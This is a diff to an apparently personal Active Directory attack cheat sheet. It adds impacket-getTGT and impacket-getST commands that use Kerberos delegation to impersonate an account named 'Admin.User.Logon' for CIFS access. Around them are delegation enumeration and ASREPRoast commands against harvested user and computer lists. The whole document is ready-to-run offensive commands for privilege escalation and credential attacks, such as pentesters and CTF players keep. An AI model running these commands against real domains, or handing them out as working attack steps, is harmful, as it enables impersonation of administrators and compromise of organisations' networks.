@@ -36,6 +36,10 @@ bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(&(objectClass=user)
 ## Delegation
 impacket-findDelegation -dc-host $DC $DOM/ -k -no-pass
 
+## Ticket: Impersonate
+impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'
+impacket-getST -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD' -altservice cifs -spn 'time/m3webaw' -impersonate 'Admin.User.Logon'
+
 ## ASREPRoast
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
